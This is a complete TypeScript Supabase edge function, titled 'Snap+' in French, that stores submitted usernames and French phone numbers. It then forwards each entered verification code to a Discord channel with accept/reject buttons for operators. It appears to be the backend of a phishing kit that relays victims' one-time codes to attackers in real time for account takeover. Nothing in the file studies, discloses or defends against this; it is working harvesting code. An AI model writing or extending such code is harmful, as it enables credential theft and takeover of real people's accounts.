import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const DISCORD_BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');
    const DISCORD_CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');
    
    if (!DISCORD_BOT_TOKEN || !DISCORD_CHANNEL_ID) {
      throw new Error('Missing Discord configuration');
    }

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const { username, phone, code, step, submissionId } = await req.json();

    // Si c'est le formulaire initial, créer une entrée
    if (step === "form") {
      const { data, error } = await supabase
        .from('submissions')
        .insert({ username, phone, status: 'pending' })
        .select()
        .single();

      if (error) throw error;

      const embed = {
        title: "📱 Nouveau formulaire Snap+",
        description: `🆕 **Nouvelle soumission**\n\n👤 **Nom d'utilisateur:** ${username}\n📞 **Téléphone:** +33${phone}`,
        color: 0xFFD700,
        timestamp: new Date().toISOString(),
        footer: { text: `ID: ${data.id}` }
      };

      await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
        method: 'POST',
        headers: { 
          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
          'Content-Type': 'application/json' 
        },
        body: JSON.stringify({ embeds: [embed] }),
      });

      return new Response(JSON.stringify({ success: true, submissionId: data.id }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // Si c'est le code, mettre à jour et envoyer avec vrais boutons
    if (step === "code" && submissionId) {
      await supabase
        .from('submissions')
        .update({ code, status: 'pending' })
        .eq('id', submissionId);

      const now = new Date();
      const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric' });
      const timeStr = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

      const embed = {
        title: "🔐 Code de vérification soumis",
        color: 0xFFD700,
        fields: [
          { name: "👤 Nom d'utilisateur", value: username, inline: false },
          { name: "🔢 Code saisi", value: `\`${code}\``, inline: true },
          { name: "📞 Téléphone", value: `+33${phone.replace(/(\d{2})(?=\d)/g, '$1 ')}`, inline: false },
          { name: "📅 Soumis à", value: `${dateStr} ${timeStr}`, inline: false },
        ],
        footer: { text: "En attente de validation par un modérateur" },
      };

      // Message avec VRAIS boutons interactifs
      const payload = {
        embeds: [embed],
        components: [
          {
            type: 1, // Action Row
            components: [
              {
                type: 2, // Button
                style: 3, // Green (Success)
                label: "Accepter",
                custom_id: `approve_${submissionId}`,
                emoji: { name: "✅" }
              },
              {
                type: 2, // Button
                style: 4, // Red (Danger)
                label: "Refuser",
                custom_id: `reject_${submissionId}`,
                emoji: { name: "❌" }
              }
            ]
          }
        ]
      };

      const response = await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
        method: 'POST',
        headers: { 
          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
          'Content-Type': 'application/json' 
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error('Discord API error:', errorText);
        throw new Error(`Discord API error: ${response.status}`);
      }

      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    return new Response(JSON.stringify({ success: true }), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    console.error('Error:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
